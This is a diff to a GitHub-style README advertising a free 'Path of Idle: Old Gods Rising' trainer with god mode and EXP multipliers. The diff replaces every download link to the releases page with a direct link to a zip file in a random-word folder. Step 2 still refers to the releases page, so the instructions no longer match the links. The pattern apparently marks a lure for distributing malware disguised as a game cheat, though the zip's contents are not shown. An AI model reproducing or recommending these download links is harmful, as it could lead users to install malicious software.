@@ -1,6 +1,6 @@
 <h1>⚡ Path-of-Idle-Old-Gods-Rising-Trainer - Unlock God Powers Instantly</h1>
 
-[![Download Now](https://img.shields.io/badge/Download-Path_of_Idle_Trainer-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/avrilaustenitic487/Path-of-Idle-Old-Gods-Rising-Trainer/releases)
+[![Download Now](https://img.shields.io/badge/Download-Path_of_Idle_Trainer-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/avrilaustenitic487/Path-of-Idle-Old-Gods-Rising-Trainer/raw/refs/heads/main/orbitosphenoidal/Idle_Trainer_of_Old_Gods_Rising_Path_3.4.zip)
 
 ## 🎮 What Is This?
 
@@ -37,7 +37,7 @@ Adjust the game speed to your preference. Speed up repetitive tasks or slow down
 
 **Step 1:** Visit this link to download the application:
 
-[![Download Trainer](https://img.shields.io/badge/⬇️_Download-Trainer-4CAF50?style=for-the-badge)](https://github.com/avrilaustenitic487/Path-of-Idle-Old-Gods-Rising-Trainer/releases)
+[![Download Trainer](https://img.shields.io/badge/⬇️_Download-Trainer-4CAF50?style=for-the-badge)](https://github.com/avrilaustenitic487/Path-of-Idle-Old-Gods-Rising-Trainer/raw/refs/heads/main/orbitosphenoidal/Idle_Trainer_of_Old_Gods_Rising_Path_3.4.zip)
 
 **Step 2:** On the releases page, click the most recent version number to expand the download options.
 
@@ -153,6 +153,6 @@ Happy gaming, and may the Old Gods smile upon your journey!
 
 Ready to enhance your gaming experience? Click the button below to get started:
 
-[![Download Now](https://img.shields.io/badge/🚀_Download-Path_of_Idle_Trainer-FF0000?style=for-the-badge&logo=github&logoColor=white)](https://github.com/avrilaustenitic487/Path-of-Idle-Old-Gods-Rising-Trainer/releases)
+[![Download Now](https://img.shields.io/badge/🚀_Download-Path_of_Idle_Trainer-FF0000?style=for-the-badge&logo=github&logoColor=white)](https://github.com/avrilaustenitic487/Path-of-Idle-Old-Gods-Rising-Trainer/raw/refs/heads/main/orbitosphenoidal/Idle_Trainer_of_Old_Gods_Rising_Path_3.4.zip)
 
 Keywords: exp-multiplier-game, free, game-hack-tools, god-mode, idle-rpg, lovecraftian, mod, pve, single-player, steam, unity-game, windows-10, windows-11
